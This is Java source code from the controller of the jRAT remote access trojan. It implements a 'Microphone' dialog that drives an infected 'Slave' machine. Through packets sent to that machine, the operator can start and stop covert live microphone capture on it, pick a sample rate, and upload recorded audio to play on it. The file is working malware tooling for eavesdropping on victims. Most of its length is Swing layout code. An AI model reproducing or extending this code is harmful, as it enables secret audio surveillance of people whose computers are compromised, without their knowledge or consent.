package io.jrat.controller.ui.dialogs;

import iconlib.IconUtils;
import io.jrat.common.SoundWriter;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet83ServerUploadSound;
import io.jrat.controller.packets.outgoing.Packet84ToggleSoundCapture;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;


@SuppressWarnings({ "serial", "rawtypes", "unchecked" })
public class DialogRemoteSoundCapture extends BaseDialog {

	public static Map<Slave, DialogRemoteSoundCapture> INSTANCES = new HashMap<Slave, DialogRemoteSoundCapture>();

	private JPanel contentPane;
	private JButton btnStartListen;
	private JButton btnStopListen;

	private JComboBox comboBox;
	private JButton btnStopRecord;
	private JButton btnStartRecording;

	public DialogRemoteSoundCapture(Slave sl) {
		super(sl);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogRemoteSoundCapture.class.getResource("/icons/microphone.png")));
		INSTANCES.put(slave, this);
		setTitle("Microphone");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 332, 114);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		btnStartListen = new JButton("Start Listening");
		btnStartListen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet84ToggleSoundCapture(true, getQuality()));
				btnStartListen.setEnabled(false);
				btnStopListen.setEnabled(true);
				comboBox.setEnabled(false);				
			}
		});
		btnStartListen.setIcon(IconUtils.getIcon("microphone-plus"));

		btnStopListen = new JButton("Stop");
		btnStopListen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				btnStartListen.setEnabled(true);
				btnStopListen.setEnabled(false);
				comboBox.setEnabled(true);
				slave.addToSendQueue(new Packet84ToggleSoundCapture(false, -1));
			}
		});
		btnStopListen.setEnabled(false);
		btnStopListen.setIcon(IconUtils.getIcon("microphone-minus"));

		comboBox = new JComboBox();
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "16000", "12000", "8000", "4000", "2000" }));
		
		btnStartRecording = new JButton("Start Recording");
		btnStartRecording.setIcon(IconUtils.getIcon("microphone-plus"));
		btnStartRecording.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				btnStartRecording.setEnabled(false);
				btnStopRecord.setEnabled(true);
				new Thread(new SoundWriter(getQuality()) {
					@Override
					public void onRead(byte[] data, int read) throws Exception {
						slave.addToSendQueue(new Packet83ServerUploadSound(data, read, getQuality()));	
					}
				}).start();
			}
		});
		
		btnStopRecord = new JButton("Stop");
		btnStopRecord.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				btnStartRecording.setEnabled(true);
				btnStopRecord.setEnabled(false);
				SoundWriter.instance.stop();
			}
		});
		btnStopRecord.setEnabled(false);
		btnStopRecord.setIcon(IconUtils.getIcon("microphone-minus"));

		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(btnStartListen)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnStopListen)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(comboBox, 0, 88, Short.MAX_VALUE))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(btnStartRecording, GroupLayout.PREFERRED_SIZE, 121, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnStopRecord, GroupLayout.PREFERRED_SIZE, 75, GroupLayout.PREFERRED_SIZE)))
					.addContainerGap())
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnStartListen)
						.addComponent(btnStopListen)
						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnStartRecording, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
						.addComponent(btnStopRecord, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE))
					.addContainerGap(19, Short.MAX_VALUE))
		);
		contentPane.setLayout(gl_contentPane);
	}

	public boolean isRunning() {
		return btnStopListen.isEnabled();
	}

	public int getQuality() {
		return Integer.parseInt(comboBox.getSelectedItem().toString());
	}

	public void exit() {
		INSTANCES.remove(slave);
	}
}
